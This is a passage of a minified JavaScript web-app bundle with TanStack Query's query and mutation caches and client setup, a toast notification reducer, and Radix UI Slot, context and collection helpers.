      s(i), (c = this.options.behavior) == null || c.onFetch(i, this), ne(this, Ts, this.state), (this.state.fetchStatus === "idle" || this.state.fetchMeta !== ((u = i.fetchOptions) == null ? void 0 : u.meta)) && $e(this, $t, pn).call(this, {
        type: "fetch",
        meta: (d = i.fetchOptions) == null ? void 0 : d.meta
      });
      const a = f => {
        var h, y, w, v;
        kc(f) && f.silent || $e(this, $t, pn).call(this, {
          type: "error",
          error: f
        }), kc(f) || ((y = (h = k(this, kt).config).onError) == null || y.call(h, f, this), (v = (w = k(this, kt).config).onSettled) == null || v.call(w, this.state.data, f, this)), this.scheduleGc()
      };
      return ne(this, Ke, dv({
        initialPromise: n == null ? void 0 : n.initialPromise,
        fn: i.fetchFn,
        abort: r.abort.bind(r),
        onSuccess: f => {
          var h, y, w, v;
          if (f === void 0) {
            a(new Error(`${this.queryHash} data is undefined`));
            return
          }
          try {
            this.setData(f)
          } catch (S) {
            a(S);
            return
          } (y = (h = k(this, kt).config).onSuccess) == null || y.call(h, f, this), (v = (w = k(this, kt).config).onSettled) == null || v.call(w, f, this.state.error, this), this.scheduleGc()
        },
        onError: a,
        onFail: (f, h) => {
          $e(this, $t, pn).call(this, {
            type: "failed",
            failureCount: f,
            error: h
          })
        },
        onPause: () => {
          $e(this, $t, pn).call(this, {
            type: "pause"
          })
        },
        onContinue: () => {
          $e(this, $t, pn).call(this, {
            type: "continue"
          })
        },
        retry: i.options.retry,
        retryDelay: i.options.retryDelay,
        networkMode: i.options.networkMode,
        canRun: () => !0
      })), k(this, Ke).start()
    }
  }, Es = new WeakMap, Ts = new WeakMap, kt = new WeakMap, Ke = new WeakMap, gi = new WeakMap, _r = new WeakMap, $t = new WeakSet, pn = function (t) {
    const n = r => {
      switch (t.type) {
        case "failed":
          return {
            ...r, fetchFailureCount: t.failureCount, fetchFailureReason: t.error
          };
        case "pause":
          return {
            ...r, fetchStatus: "paused"
          };
        case "continue":
          return {
            ...r, fetchStatus: "fetching"
          };
        case "fetch":
          return {
            ...r, ...uS(r.data, this.options), fetchMeta: t.meta ?? null
          };
        case "success":
          return {
            ...r, data: t.data, dataUpdateCount: r.dataUpdateCount + 1, dataUpdatedAt: t.dataUpdatedAt ?? Date.now(), error: null, isInvalidated: !1, status: "success", ...!t.manual && {
              fetchStatus: "idle",
              fetchFailureCount: 0,
              fetchFailureReason: null
            }
          };
        case "error":
          const s = t.error;
          return kc(s) && s.revert && k(this, Ts) ? {
            ...k(this, Ts),
            fetchStatus: "idle"
          } : {
            ...r,
            error: s,
            errorUpdateCount: r.errorUpdateCount + 1,
            errorUpdatedAt: Date.now(),
            fetchFailureCount: r.fetchFailureCount + 1,
            fetchFailureReason: s,
            fetchStatus: "idle",
            status: "error"
          };
        case "invalidate":
          return {
            ...r, isInvalidated: !0
          };
        case "setState":
          return {
            ...r, ...t.state
          }
      }
    };
    this.state = n(this.state), nt.batch(() => {
      this.observers.forEach(r => {
        r.onQueryUpdate()
      }), k(this, kt).notify({
        query: this,
        type: "updated",
        action: t
      })
    })
  }, zg);

function uS(e, t) {
  return {
    fetchFailureCount: 0,
    fetchFailureReason: null,
    fetchStatus: cv(t.networkMode) ? "fetching" : "paused",
    ...e === void 0 && {
      error: null,
      status: "pending"
    }
  }
}

function dS(e) {
  const t = typeof e.initialData == "function" ? e.initialData() : e.initialData,
    n = t !== void 0,
    r = n ? typeof e.initialDataUpdatedAt == "function" ? e.initialDataUpdatedAt() : e.initialDataUpdatedAt : 0;
  return {
    data: t,
    dataUpdateCount: 0,
    dataUpdatedAt: n ? r ?? Date.now() : 0,
    error: null,
    errorUpdateCount: 0,
    errorUpdatedAt: 0,
    fetchFailureCount: 0,
    fetchFailureReason: null,
    fetchMeta: null,
    isInvalidated: !1,
    status: n ? "success" : "pending",
    fetchStatus: "idle"
  }
}
var Zt, Ug, fS = (Ug = class extends Ml {
  constructor(t = {}) {
    super();
    ae(this, Zt);
    this.config = t, ne(this, Zt, new Map)
  }
  build(t, n, r) {
    const s = n.queryKey,
      o = n.queryHash ?? Sf(s, n);
    let i = this.get(o);
    return i || (i = new cS({
      cache: this,
      queryKey: s,
      queryHash: o,
      options: t.defaultQueryOptions(n),
      state: r,
      defaultOptions: t.getQueryDefaults(s)
    }), this.add(i)), i
  }
  add(t) {
    k(this, Zt).has(t.queryHash) || (k(this, Zt).set(t.queryHash, t), this.notify({
      type: "added",
      query: t
    }))
  }
  remove(t) {
    const n = k(this, Zt).get(t.queryHash);
    n && (t.destroy(), n === t && k(this, Zt).delete(t.queryHash), this.notify({
      type: "removed",
      query: t
    }))
  }
  clear() {
    nt.batch(() => {
      this.getAll().forEach(t => {
        this.remove(t)
      })
    })
  }
  get(t) {
    return k(this, Zt).get(t)
  }
  getAll() {
    return [...k(this, Zt).values()]
  }
  find(t) {
    const n = {
      exact: !0,
      ...t
    };
    return this.getAll().find(r => Im(n, r))
  }
  findAll(t = {}) {
    const n = this.getAll();
    return Object.keys(t).length > 0 ? n.filter(r => Im(t, r)) : n
  }
  notify(t) {
    nt.batch(() => {
      this.listeners.forEach(n => {
        n(t)
      })
    })
  }
  onFocus() {
    nt.batch(() => {
      this.getAll().forEach(t => {
        t.onFocus()
      })
    })
  }
  onOnline() {
    nt.batch(() => {
      this.getAll().forEach(t => {
        t.onOnline()
      })
    })
  }
}, Zt = new WeakMap, Ug),
  en, Ze, Ir, tn, Bn, $g, hS = ($g = class extends fv {
    constructor(t) {
      super();
      ae(this, tn);
      ae(this, en);
      ae(this, Ze);
      ae(this, Ir);
      this.mutationId = t.mutationId, ne(this, Ze, t.mutationCache), ne(this, en, []), this.state = t.state || mS(), this.setOptions(t.options), this.scheduleGc()
    }
    setOptions(t) {
      this.options = t, this.updateGcTime(this.options.gcTime)
    }
    get meta() {
      return this.options.meta
    }
    addObserver(t) {
      k(this, en).includes(t) || (k(this, en).push(t), this.clearGcTimeout(), k(this, Ze).notify({
        type: "observerAdded",
        mutation: this,
        observer: t
      }))
    }
    removeObserver(t) {
      ne(this, en, k(this, en).filter(n => n !== t)), this.scheduleGc(), k(this, Ze).notify({
        type: "observerRemoved",
        mutation: this,
        observer: t
      })
    }
    optionalRemove() {
      k(this, en).length || (this.state.status === "pending" ? this.scheduleGc() : k(this, Ze).remove(this))
    }
    continue() {
      var t;
      return ((t = k(this, Ir)) == null ? void 0 : t.continue()) ?? this.execute(this.state.variables)
    }
    async execute(t) {
      var s, o, i, a, c, u, d, f, h, y, w, v, S, g, p, m, b, C, j, A;
      ne(this, Ir, dv({
        fn: () => this.options.mutationFn ? this.options.mutationFn(t) : Promise.reject(new Error("No mutationFn found")),
        onFail: (P, M) => {
          $e(this, tn, Bn).call(this, {
            type: "failed",
            failureCount: P,
            error: M
          })
        },
        onPause: () => {
          $e(this, tn, Bn).call(this, {
            type: "pause"
          })
        },
        onContinue: () => {
          $e(this, tn, Bn).call(this, {
            type: "continue"
          })
        },
        retry: this.options.retry ?? 0,
        retryDelay: this.options.retryDelay,
        networkMode: this.options.networkMode,
        canRun: () => k(this, Ze).canRun(this)
      }));
      const n = this.state.status === "pending",
        r = !k(this, Ir).canStart();
      try {
        if (!n) {
          $e(this, tn, Bn).call(this, {
            type: "pending",
            variables: t,
            isPaused: r
          }), await ((o = (s = k(this, Ze).config).onMutate) == null ? void 0 : o.call(s, t, this));
          const M = await ((a = (i = this.options).onMutate) == null ? void 0 : a.call(i, t));
          M !== this.state.context && $e(this, tn, Bn).call(this, {
            type: "pending",
            context: M,
            variables: t,
            isPaused: r
          })
        }
        const P = await k(this, Ir).start();
        return await ((u = (c = k(this, Ze).config).onSuccess) == null ? void 0 : u.call(c, P, t, this.state.context, this)), await ((f = (d = this.options).onSuccess) == null ? void 0 : f.call(d, P, t, this.state.context)), await ((y = (h = k(this, Ze).config).onSettled) == null ? void 0 : y.call(h, P, null, this.state.variables, this.state.context, this)), await ((v = (w = this.options).onSettled) == null ? void 0 : v.call(w, P, null, t, this.state.context)), $e(this, tn, Bn).call(this, {
          type: "success",
          data: P
        }), P
      } catch (P) {
        try {
          throw await ((g = (S = k(this, Ze).config).onError) == null ? void 0 : g.call(S, P, t, this.state.context, this)), await ((m = (p = this.options).onError) == null ? void 0 : m.call(p, P, t, this.state.context)), await ((C = (b = k(this, Ze).config).onSettled) == null ? void 0 : C.call(b, void 0, P, this.state.variables, this.state.context, this)), await ((A = (j = this.options).onSettled) == null ? void 0 : A.call(j, void 0, P, t, this.state.context)), P
        } finally {
          $e(this, tn, Bn).call(this, {
            type: "error",
            error: P
          })
        }
      } finally {
        k(this, Ze).runNext(this)
      }
    }
  }, en = new WeakMap, Ze = new WeakMap, Ir = new WeakMap, tn = new WeakSet, Bn = function (t) {
    const n = r => {
      switch (t.type) {
        case "failed":
          return {
            ...r, failureCount: t.failureCount, failureReason: t.error
          };
        case "pause":
          return {
            ...r, isPaused: !0
          };
        case "continue":
          return {
            ...r, isPaused: !1
          };
        case "pending":
          return {
            ...r, context: t.context, data: void 0, failureCount: 0, failureReason: null, error: null, isPaused: t.isPaused, status: "pending", variables: t.variables, submittedAt: Date.now()
          };
        case "success":
          return {
            ...r, data: t.data, failureCount: 0, failureReason: null, error: null, status: "success", isPaused: !1
          };
        case "error":
          return {
            ...r, data: void 0, error: t.error, failureCount: r.failureCount + 1, failureReason: t.error, isPaused: !1, status: "error"
          }
      }
    };
    this.state = n(this.state), nt.batch(() => {
      k(this, en).forEach(r => {
        r.onMutationUpdate(t)
      }), k(this, Ze).notify({
        mutation: this,
        type: "updated",
        action: t
      })
    })
  }, $g);

function mS() {
  return {
    context: void 0,
    data: void 0,
    error: null,
    failureCount: 0,
    failureReason: null,
    isPaused: !1,
    status: "idle",
    variables: void 0,
    submittedAt: 0
  }
}
var mt, yi, Hg, pS = (Hg = class extends Ml {
  constructor(t = {}) {
    super();
    ae(this, mt);
    ae(this, yi);
    this.config = t, ne(this, mt, new Map), ne(this, yi, Date.now())
  }
  build(t, n, r) {
    const s = new hS({
      mutationCache: this,
      mutationId: ++Fi(this, yi)._,
      options: t.defaultMutationOptions(n),
      state: r
    });
    return this.add(s), s
  }
  add(t) {
    const n = na(t),
      r = k(this, mt).get(n) ?? [];
    r.push(t), k(this, mt).set(n, r), this.notify({
      type: "added",
      mutation: t
    })
  }
  remove(t) {
    var r;
    const n = na(t);
    if (k(this, mt).has(n)) {
      const s = (r = k(this, mt).get(n)) == null ? void 0 : r.filter(o => o !== t);
      s && (s.length === 0 ? k(this, mt).delete(n) : k(this, mt).set(n, s))
    }
    this.notify({
      type: "removed",
      mutation: t
    })
  }
  canRun(t) {
    var r;
    const n = (r = k(this, mt).get(na(t))) == null ? void 0 : r.find(s => s.state.status === "pending");
    return !n || n === t
  }
  runNext(t) {
    var r;
    const n = (r = k(this, mt).get(na(t))) == null ? void 0 : r.find(s => s !== t && s.state.isPaused);
    return (n == null ? void 0 : n.continue()) ?? Promise.resolve()
  }
  clear() {
    nt.batch(() => {
      this.getAll().forEach(t => {
        this.remove(t)
      })
    })
  }
  getAll() {
    return [...k(this, mt).values()].flat()
  }
  find(t) {
    const n = {
      exact: !0,
      ...t
    };
    return this.getAll().find(r => Lm(n, r))
  }
  findAll(t = {}) {
    return this.getAll().filter(n => Lm(t, n))
  }
  notify(t) {
    nt.batch(() => {
      this.listeners.forEach(n => {
        n(t)
      })
    })
  }
  resumePausedMutations() {
    const t = this.getAll().filter(n => n.state.isPaused);
    return nt.batch(() => Promise.all(t.map(n => n.continue().catch(Ut))))
  }
}, mt = new WeakMap, yi = new WeakMap, Hg);

function na(e) {
  var t;
  return ((t = e.options.scope) == null ? void 0 : t.id) ?? String(e.mutationId)
}

function Vm(e) {
  return {
    onFetch: (t, n) => {
      var d, f, h, y, w;
      const r = t.options,
        s = (h = (f = (d = t.fetchOptions) == null ? void 0 : d.meta) == null ? void 0 : f.fetchMore) == null ? void 0 : h.direction,
        o = ((y = t.state.data) == null ? void 0 : y.pages) || [],
        i = ((w = t.state.data) == null ? void 0 : w.pageParams) || [];
      let a = {
        pages: [],
        pageParams: []
      },
        c = 0;
      const u = async () => {
        let v = !1;
        const S = m => {
          Object.defineProperty(m, "signal", {
            enumerable: !0,
            get: () => (t.signal.aborted ? v = !0 : t.signal.addEventListener("abort", () => {
              v = !0
            }), t.signal)
          })
        },
          g = av(t.options, t.fetchOptions),
          p = async (m, b, C) => {
            if (v) return Promise.reject();
            if (b == null && m.pages.length) return Promise.resolve(m);
            const j = {
              queryKey: t.queryKey,
              pageParam: b,
              direction: C ? "backward" : "forward",
              meta: t.options.meta
            };
            S(j);
            const A = await g(j),
              {
                maxPages: P
              } = t.options,
              M = C ? rS : nS;
            return {
              pages: M(m.pages, A, P),
              pageParams: M(m.pageParams, b, P)
            }
          };
        if (s && o.length) {
          const m = s === "backward",
            b = m ? gS : Bm,
            C = {
              pages: o,
              pageParams: i
            },
            j = b(r, C);
          a = await p(C, j, m)
        } else {
          const m = e ?? o.length;
          do {
            const b = c === 0 ? i[0] ?? r.initialPageParam : Bm(r, a);
            if (c > 0 && b == null) break;
            a = await p(a, b), c++
          } while (c < m)
        }
        return a
      };
      t.options.persister ? t.fetchFn = () => {
        var v, S;
        return (S = (v = t.options).persister) == null ? void 0 : S.call(v, u, {
          queryKey: t.queryKey,
          meta: t.options.meta,
          signal: t.signal
        }, n)
      } : t.fetchFn = u
    }
  }
}

function Bm(e, {
  pages: t,
  pageParams: n
}) {
  const r = t.length - 1;
  return t.length > 0 ? e.getNextPageParam(t[r], t, n[r], n) : void 0
}

function gS(e, {
  pages: t,
  pageParams: n
}) {
  var r;
  return t.length > 0 ? (r = e.getPreviousPageParam) == null ? void 0 : r.call(e, t[0], t, n[0], n) : void 0
}
var Se, qn, Yn, ks, Rs, Xn, Ds, Ms, Wg, yS = (Wg = class {
  constructor(e = {}) {
    ae(this, Se);
    ae(this, qn);
    ae(this, Yn);
    ae(this, ks);
    ae(this, Rs);
    ae(this, Xn);
    ae(this, Ds);
    ae(this, Ms);
    ne(this, Se, e.queryCache || new fS), ne(this, qn, e.mutationCache || new pS), ne(this, Yn, e.defaultOptions || {}), ne(this, ks, new Map), ne(this, Rs, new Map), ne(this, Xn, 0)
  }
  mount() {
    Fi(this, Xn)._++, k(this, Xn) === 1 && (ne(this, Ds, lv.subscribe(async e => {
      e && (await this.resumePausedMutations(), k(this, Se).onFocus())
    })), ne(this, Ms, el.subscribe(async e => {
      e && (await this.resumePausedMutations(), k(this, Se).onOnline())
    })))
  }
  unmount() {
    var e, t;
    Fi(this, Xn)._--, k(this, Xn) === 0 && ((e = k(this, Ds)) == null || e.call(this), ne(this, Ds, void 0), (t = k(this, Ms)) == null || t.call(this), ne(this, Ms, void 0))
  }
  isFetching(e) {
    return k(this, Se).findAll({
      ...e,
      fetchStatus: "fetching"
    }).length
  }
  isMutating(e) {
    return k(this, qn).findAll({
      ...e,
      status: "pending"
    }).length
  }
  getQueryData(e) {
    var n;
    const t = this.defaultQueryOptions({
      queryKey: e
    });
    return (n = k(this, Se).get(t.queryHash)) == null ? void 0 : n.state.data
  }
  ensureQueryData(e) {
    const t = this.getQueryData(e.queryKey);
    if (t === void 0) return this.fetchQuery(e);
    {
      const n = this.defaultQueryOptions(e),
        r = k(this, Se).build(this, n);
      return e.revalidateIfStale && r.isStaleByTime(_m(n.staleTime, r)) && this.prefetchQuery(n), Promise.resolve(t)
    }
  }
  getQueriesData(e) {
    return k(this, Se).findAll(e).map(({
      queryKey: t,
      state: n
    }) => {
      const r = n.data;
      return [t, r]
    })
  }
  setQueryData(e, t, n) {
    const r = this.defaultQueryOptions({
      queryKey: e
    }),
      s = k(this, Se).get(r.queryHash),
      o = s == null ? void 0 : s.state.data,
      i = Yb(t, o);
    if (i !== void 0) return k(this, Se).build(this, r).setData(i, {
      ...n,
      manual: !0
    })
  }
  setQueriesData(e, t, n) {
    return nt.batch(() => k(this, Se).findAll(e).map(({
      queryKey: r
    }) => [r, this.setQueryData(r, t, n)]))
  }
  getQueryState(e) {
    var n;
    const t = this.defaultQueryOptions({
      queryKey: e
    });
    return (n = k(this, Se).get(t.queryHash)) == null ? void 0 : n.state
  }
  removeQueries(e) {
    const t = k(this, Se);
    nt.batch(() => {
      t.findAll(e).forEach(n => {
        t.remove(n)
      })
    })
  }
  resetQueries(e, t) {
    const n = k(this, Se),
      r = {
        type: "active",
        ...e
      };
    return nt.batch(() => (n.findAll(e).forEach(s => {
      s.reset()
    }), this.refetchQueries(r, t)))
  }
  cancelQueries(e = {}, t = {}) {
    const n = {
      revert: !0,
      ...t
    },
      r = nt.batch(() => k(this, Se).findAll(e).map(s => s.cancel(n)));
    return Promise.all(r).then(Ut).catch(Ut)
  }
  invalidateQueries(e = {}, t = {}) {
    return nt.batch(() => {
      if (k(this, Se).findAll(e).forEach(r => {
        r.invalidate()
      }), e.refetchType === "none") return Promise.resolve();
      const n = {
        ...e,
        type: e.refetchType ?? e.type ?? "active"
      };
      return this.refetchQueries(n, t)
    })
  }
  refetchQueries(e = {}, t) {
    const n = {
      ...t,
      cancelRefetch: (t == null ? void 0 : t.cancelRefetch) ?? !0
    },
      r = nt.batch(() => k(this, Se).findAll(e).filter(s => !s.isDisabled()).map(s => {
        let o = s.fetch(void 0, n);
        return n.throwOnError || (o = o.catch(Ut)), s.state.fetchStatus === "paused" ? Promise.resolve() : o
      }));
    return Promise.all(r).then(Ut)
  }
  fetchQuery(e) {
    const t = this.defaultQueryOptions(e);
    t.retry === void 0 && (t.retry = !1);
    const n = k(this, Se).build(this, t);
    return n.isStaleByTime(_m(t.staleTime, n)) ? n.fetch(t) : Promise.resolve(n.state.data)
  }
  prefetchQuery(e) {
    return this.fetchQuery(e).then(Ut).catch(Ut)
  }
  fetchInfiniteQuery(e) {
    return e.behavior = Vm(e.pages), this.fetchQuery(e)
  }
  prefetchInfiniteQuery(e) {
    return this.fetchInfiniteQuery(e).then(Ut).catch(Ut)
  }
  ensureInfiniteQueryData(e) {
    return e.behavior = Vm(e.pages), this.ensureQueryData(e)
  }
  resumePausedMutations() {
    return el.isOnline() ? k(this, qn).resumePausedMutations() : Promise.resolve()
  }
  getQueryCache() {
    return k(this, Se)
  }
  getMutationCache() {
    return k(this, qn)
  }
  getDefaultOptions() {
    return k(this, Yn)
  }
  setDefaultOptions(e) {
    ne(this, Yn, e)
  }
  setQueryDefaults(e, t) {
    k(this, ks).set(ii(e), {
      queryKey: e,
      defaultOptions: t
    })
  }
  getQueryDefaults(e) {
    const t = [...k(this, ks).values()];
    let n = {};
    return t.forEach(r => {
      ai(e, r.queryKey) && (n = {
        ...n,
        ...r.defaultOptions
      })
    }), n
  }
  setMutationDefaults(e, t) {
    k(this, Rs).set(ii(e), {
      mutationKey: e,
      defaultOptions: t
    })
  }
  getMutationDefaults(e) {
    const t = [...k(this, Rs).values()];
    let n = {};
    return t.forEach(r => {
      ai(e, r.mutationKey) && (n = {
        ...n,
        ...r.defaultOptions
      })
    }), n
  }
  defaultQueryOptions(e) {
    if (e._defaulted) return e;
    const t = {
      ...k(this, Yn).queries,
      ...this.getQueryDefaults(e.queryKey),
      ...e,
      _defaulted: !0
    };
    return t.queryHash || (t.queryHash = Sf(t.queryKey, t)), t.refetchOnReconnect === void 0 && (t.refetchOnReconnect = t.networkMode !== "always"), t.throwOnError === void 0 && (t.throwOnError = !!t.suspense), !t.networkMode && t.persister && (t.networkMode = "offlineFirst"), t.enabled !== !0 && t.queryFn === Cf && (t.enabled = !1), t
  }
  defaultMutationOptions(e) {
    return e != null && e._defaulted ? e : {
      ...k(this, Yn).mutations,
      ...(e == null ? void 0 : e.mutationKey) && this.getMutationDefaults(e.mutationKey),
      ...e,
      _defaulted: !0
    }
  }
  clear() {
    k(this, Se).clear(), k(this, qn).clear()
  }
}, Se = new WeakMap, qn = new WeakMap, Yn = new WeakMap, ks = new WeakMap, Rs = new WeakMap, Xn = new WeakMap, Ds = new WeakMap, Ms = new WeakMap, Wg),
  vS = x.createContext(void 0),
  xS = ({
    client: e,
    children: t
  }) => (x.useEffect(() => (e.mount(), () => {
    e.unmount()
  }), [e]), l.jsx(vS.Provider, {
    value: e,
    children: t
  }));
const wS = new yS({
  defaultOptions: {
    queries: {
      queryFn: async ({
        queryKey: e
      }) => {
        const t = await fetch(e[0], {
          credentials: "include"
        });
        if (!t.ok) throw t.status >= 500 ? new Error(`${t.status}: ${t.statusText}`) : new Error(`${t.status}: ${await t.text()}`);
        return t.json()
      },
      refetchInterval: !1,
      refetchOnWindowFocus: !1,
      staleTime: 1 / 0,
      retry: !1
    },
    mutations: {
      retry: !1
    }
  }
}),
  bS = 1,
  SS = 1e6;
let Rc = 0;

function CS() {
  return Rc = (Rc + 1) % Number.MAX_SAFE_INTEGER, Rc.toString()
}
const Dc = new Map,
  zm = e => {
    if (Dc.has(e)) return;
    const t = setTimeout(() => {
      Dc.delete(e), Oo({
        type: "REMOVE_TOAST",
        toastId: e
      })
    }, SS);
    Dc.set(e, t)
  },
  NS = (e, t) => {
    switch (t.type) {
      case "ADD_TOAST":
        return {
          ...e, toasts: [t.toast, ...e.toasts].slice(0, bS)
        };
      case "UPDATE_TOAST":
        return {
          ...e, toasts: e.toasts.map(n => n.id === t.toast.id ? {
            ...n,
            ...t.toast
          } : n)
        };
      case "DISMISS_TOAST": {
        const {
          toastId: n
        } = t;
        return n ? zm(n) : e.toasts.forEach(r => {
          zm(r.id)
        }), {
          ...e,
          toasts: e.toasts.map(r => r.id === n || n === void 0 ? {
            ...r,
            open: !1
          } : r)
        }
      }
      case "REMOVE_TOAST":
        return t.toastId === void 0 ? {
          ...e,
          toasts: []
        } : {
          ...e,
          toasts: e.toasts.filter(n => n.id !== t.toastId)
        }
    }
  },
  Ca = [];
let Na = {
  toasts: []
};

function Oo(e) {
  Na = NS(Na, e), Ca.forEach(t => {
    t(Na)
  })
}

function jS({
  ...e
}) {
  const t = CS(),
    n = s => Oo({
      type: "UPDATE_TOAST",
      toast: {
        ...s,
        id: t
      }
    }),
    r = () => Oo({
      type: "DISMISS_TOAST",
      toastId: t
    });
  return Oo({
    type: "ADD_TOAST",
    toast: {
      ...e,
      id: t,
      open: !0,
      onOpenChange: s => {
        s || r()
      }
    }
  }), {
    id: t,
    dismiss: r,
    update: n
  }
}

function AS() {
  const [e, t] = x.useState(Na);
  return x.useEffect(() => (Ca.push(t), () => {
    const n = Ca.indexOf(t);
    n > -1 && Ca.splice(n, 1)
  }), [e]), {
    ...e,
    toast: jS,
    dismiss: n => Oo({
      type: "DISMISS_TOAST",
      toastId: n
    })
  }
}

function gt(e, t, {
  checkForDefaultPrevented: n = !0
} = {}) {
  return function (s) {
    if (e == null || e(s), n === !1 || !s.defaultPrevented) return t == null ? void 0 : t(s)
  }
}

function PS(e, t) {
  typeof e == "function" ? e(t) : e != null && (e.current = t)
}

function hv(...e) {
  return t => e.forEach(n => PS(n, t))
}

function Hr(...e) {
  return x.useCallback(hv(...e), e)
}

function ES(e, t = []) {
  let n = [];

  function r(o, i) {
    const a = x.createContext(i),
      c = n.length;
    n = [...n, i];

    function u(f) {
      const {
        scope: h,
        children: y,
        ...w
      } = f, v = (h == null ? void 0 : h[e][c]) || a, S = x.useMemo(() => w, Object.values(w));
      return l.jsx(v.Provider, {
        value: S,
        children: y
      })
    }

    function d(f, h) {
      const y = (h == null ? void 0 : h[e][c]) || a,
        w = x.useContext(y);
      if (w) return w;
      if (i !== void 0) return i;
      throw new Error(`\`${f}\` must be used within \`${o}\``)
    }
    return u.displayName = o + "Provider", [u, d]
  }
  const s = () => {
    const o = n.map(i => x.createContext(i));
    return function (a) {
      const c = (a == null ? void 0 : a[e]) || o;
      return x.useMemo(() => ({
        [`__scope${e}`]: {
          ...a,
          [e]: c
        }
      }), [a, c])
    }
  };
  return s.scopeName = e, [r, TS(s, ...t)]
}

function TS(...e) {
  const t = e[0];
  if (e.length === 1) return t;
  const n = () => {
    const r = e.map(s => ({
      useScope: s(),
      scopeName: s.scopeName
    }));
    return function (o) {
      const i = r.reduce((a, {
        useScope: c,
        scopeName: u
      }) => {
        const f = c(o)[`__scope${u}`];
        return {
          ...a,
          ...f
        }
      }, {});
      return x.useMemo(() => ({
        [`__scope${t.scopeName}`]: i
      }), [i])
    }
  };
  return n.scopeName = t.scopeName, n
}
var li = x.forwardRef((e, t) => {
  const {
    children: n,
    ...r
  } = e, s = x.Children.toArray(n), o = s.find(RS);
  if (o) {
    const i = o.props.children,
      a = s.map(c => c === o ? x.Children.count(i) > 1 ? x.Children.only(null) : x.isValidElement(i) ? i.props.children : null : c);
    return l.jsx(Zu, {
      ...r,
      ref: t,
      children: x.isValidElement(i) ? x.cloneElement(i, void 0, a) : null
    })
  }
  return l.jsx(Zu, {
    ...r,
    ref: t,
    children: n
  })
});
li.displayName = "Slot";
var Zu = x.forwardRef((e, t) => {
  const {
    children: n,
    ...r
  } = e;
  if (x.isValidElement(n)) {
    const s = MS(n);
    return x.cloneElement(n, {
      ...DS(r, n.props),
      ref: t ? hv(t, s) : s
    })
  }
  return x.Children.count(n) > 1 ? x.Children.only(null) : null
});
Zu.displayName = "SlotClone";
var kS = ({
  children: e
}) => l.jsx(l.Fragment, {
  children: e
});

function RS(e) {
  return x.isValidElement(e) && e.type === kS
}

function DS(e, t) {
  const n = {
    ...t
  };
  for (const r in t) {
    const s = e[r],
      o = t[r];
    /^on[A-Z]/.test(r) ? s && o ? n[r] = (...a) => {
      o(...a), s(...a)
    } : s && (n[r] = s) : r === "style" ? n[r] = {
      ...s,
      ...o
    } : r === "className" && (n[r] = [s, o].filter(Boolean).join(" "))
  }
  return {
    ...e,
    ...n
  }
}

function MS(e) {
  var r, s;
  let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get,
    n = t && "isReactWarning" in t && t.isReactWarning;
  return n ? e.ref : (t = (s = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : s.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref)
}

function _S(e) {
  const t = e + "CollectionProvider",
    [n, r] = ES(t),
    [s, o] = n(t, {
      collectionRef: {
        current: null
      },
      itemMap: new Map
    }),
    i = y => {
      const {
        scope: w,
        children: v
      } = y, S = ce.useRef(null), g = ce.useRef(new Map).current;
      return l.jsx(s, {
        scope: w,
        itemMap: g,
        collectionRef: S,
        children: v
      })
    };
  i.displayName = t;
  const a = e + "CollectionSlot",
    c = ce.forwardRef((y, w) => {
      const {
        scope: v,
        children: S
      } = y, g = o(a, v), p = Hr(w, g.collectionRef);
      return l.jsx(li, {
        ref: p,
        children: S
      })
    });
  c.displayName = a;
  const u = e + "CollectionItemSlot",
    d = "data-radix-collection-item",
    f = ce.forwardRef((y, w) => {
      const {
        scope: v,
        children: S,
        ...g
      } = y, p = ce.useRef(null), m = Hr(w, p), b = o(u, v);
      return ce.useEffect(() => (b.itemMap.set(p, {
        ref: p,
        ...g
      }), () => void b.itemMap.delete(p))), l.jsx(li, {
        [d]: "",
        ref: m,
        children: S
      })
    });
  f.displayName = u;

  function h(y) {
    const w = o(e + "CollectionConsumer", y);
    return ce.useCallback(() => {
      const S = w.collectionRef.current;
      if (!S) return [];
      const g = Array.from(S.querySelectorAll(`[${d}]`));
      return Array.from(w.itemMap.values()).sort((b, C) => g.indexOf(b.ref.current) - g.indexOf(C.ref.current))
    }, [w.collectionRef, w.itemMap])
  }
  return [{
    Provider: i,
    Slot: c,
    ItemSlot: f
  }, h, r]
}

function IS(e, t = []) {
  let n = [];

  function r(o, i) {
    const a = x.createContext(i),
      c = n.length;
    n = [...n, i];
    const u = f => {
      var g;
      const {
        scope: h,
        children: y,
        ...w
      } = f, v = ((g = h == null ? void 0 : h[e]) == null ? void 0 : g[c]) || a, S = x.useMemo(() => w, Object.values(w));
      return l.jsx(v.Provider, {
        value: S,
        children: y
      })
    };
    u.displayName = o + "Provider";

    function d(f, h) {
      var v;
      const y = ((v = h == null ? void 0 : h[e]) == null ? void 0 : v[c]) || a,
        w = x.useContext(y);
      if (w) return w;
      if (i !== void 0) return i;
      throw new Error(`\`${f}\` must be used within \`${o}\``)
    }
    return [u, d]
  }
  const s = () => {
    const o = n.map(i => x.createContext(i));
    return function (a) {
      const c = (a == null ? void 0 : a[e]) || o;
      return x.useMemo(() => ({
        [`__scope${e}`]: {
          ...a,
          [e]: c
        }
      }), [a, c])
    }
  };
  return s.scopeName = e, [r, LS(s, ...t)]
}

function LS(...e) {
  const t = e[0];
  if (e.length === 1) return t;
  const n = () => {
    const r = e.map(s => ({
      useScope: s(),
      scopeName: s.scopeName
    }));
    return function (o) {
      const i = r.reduce((a, {
        useScope: c,
        scopeName: u
      }) => {
        const f = c(o)[`__scope${u}`];
        return {
          ...a,
          ...f
        }
      }, {});
      return x.useMemo(() => ({
        [`__scope${t.scopeName}`]: i
      }), [i])
    }
  };
  return n.scopeName = t.scopeName, n
}
var OS = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"],
  cn = OS.reduce((e, t) => {
    const n = x.forwardRef((r, s) => {
      const {
        asChild: o,
        ...i
      } = r, a = o ? li : t;
      return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0), l.jsx(a, {
        ...i,
        ref: s
      })
    });
    return n.displayName = `Primitive.${t}`, {
      ...e,
      [t]: n
    }
  }, {});

function mv(e, t) {
  e && Dl.flushSync(() => e.dispatchEvent(t))
}

function Dn(e) {
  const t = x.useRef(e);
  return x.useEffect(() => {
    t.current = e
  }), x.useMemo(() => (...n) => {
    var r;
    return (r = t.current) == null ? void 0 : r.call(t, ...n)
  }, [])
}

function FS(e, t = globalThis == null ? void 0 : globalThis.document) {
  const n = Dn(e);
